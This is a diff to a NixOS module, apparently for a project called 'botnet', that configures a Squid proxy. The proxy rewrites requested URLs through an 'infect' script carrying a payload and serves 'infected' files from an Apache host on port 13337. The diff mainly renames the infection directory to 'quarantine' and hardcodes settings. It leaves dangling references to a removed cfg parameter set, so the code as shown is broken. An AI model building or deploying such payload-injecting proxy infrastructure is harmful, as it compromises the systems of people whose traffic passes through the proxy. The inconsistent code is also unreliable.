@@ -1,22 +1,10 @@
-cfg@{
-  user,
-  group,
-  payloadURL,
-  proxyPort ? 3128,
-  infectionPort ? 13337,
-  infectionDir ? "/var/botnet/infection",
-  stateDir ? "/run/botnet",
-  logDir ? "/var/log/botnet",
-  adminAddr ? "foo"
-}:
-
 { pkgs, ... }:
 
 let
 
-  configFile = pkgs.writeText "squid.conf" ''
-    http_port ${toString cfg.proxyPort}
+  payloadURL = "";
 
+  squidConfig = ''
     acl all src all
 
     acl SSL_ports port 443
@@ -41,11 +29,6 @@ let
     forwarded_for off
     via off
 
-    access_log daemon:${cfg.logDir}/access.log squid
-    cache_log ${cfg.logDir}/cache.log squid
-    pid_filename ${cfg.stateDir}/pid
-    cache_effective_user ${cfg.user}
-
     url_rewrite_program ${infect}/infect
   '';
 
@@ -54,7 +37,7 @@ let
     exe = ''
       #!/bin/sh
       export PAYLOAD=${payload}
-      export INFECTION_DIR=${toString cfg.infectionDir}
+      export INFECTION_DIR=${toString cfg.quarantine}
       export INFECTION_PORT=${toString cfg.infectionPort}
       exec ${pkgs.python3}/bin/python3 ${./infect.py}
     '';
@@ -77,7 +60,18 @@ let
     })();
   '';
 
+  mkQuarantine = ''
+    [ -d /var/quarantine ] && rm -r /var/quarantine
+    mkdir -p ${cfg.dir}
+    chown ${cfg.user} ${cfg.dir}
+    cp ${./htaccess} ${cfg.dir}/.htaccess
+  '';
+
 in {
+
+  imports = [
+    ./squid
+  ];
 
   networking.firewall.allowedTCPPorts = [
     80 cfg.proxyPort
@@ -85,50 +79,19 @@ in {
 
   services.httpd = {
     enable = true;
-    user = cfg.user;
-    group = cfg.group;
-    adminAddr = cfg.adminAddr;
+    user = "botnet";
+    group = "botnet";
+    adminAddr = "foo";
     virtualHosts = [
       {
         listen = [ { port = 80; } ];
         documentRoot = ./homepage;
       }
       {
-        listen = [ { port = cfg.infectionPort; } ];
-        documentRoot = cfg.infectionDir;
+        listen = [ { port = 13337; } ];
+        documentRoot = "/var/quarantine";
       }
     ];
-  };
-
-  systemd.services.squid = {
-    description = "Web Proxy Cache Server";
-    after = [ "network.target" ];
-    wantedBy = [ "multi-user.target" ];
-
-    path = [
-      pkgs.squid pkgs.coreutils
-    ];
-
-    serviceConfig = {
-      Type = "forking";
-      PIDFile = "${cfg.stateDir}/pid";
-      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
-      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
-      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
-    };
-
-    preStart = ''
-      [ -d ${cfg.infectionDir} ] && rm -r ${cfg.infectionDir}
-      mkdir -p ${cfg.infectionDir}
-      chown ${cfg.user} ${cfg.infectionDir}
-      cp ${./htaccess} ${cfg.infectionDir}/.htaccess
-
-      mkdir -p ${cfg.stateDir}
-      mkdir -p ${cfg.logDir}
-      chown ${cfg.user} ${cfg.stateDir}
-      chown ${cfg.user} ${cfg.logDir}
-    '';
-
   };
 
 }
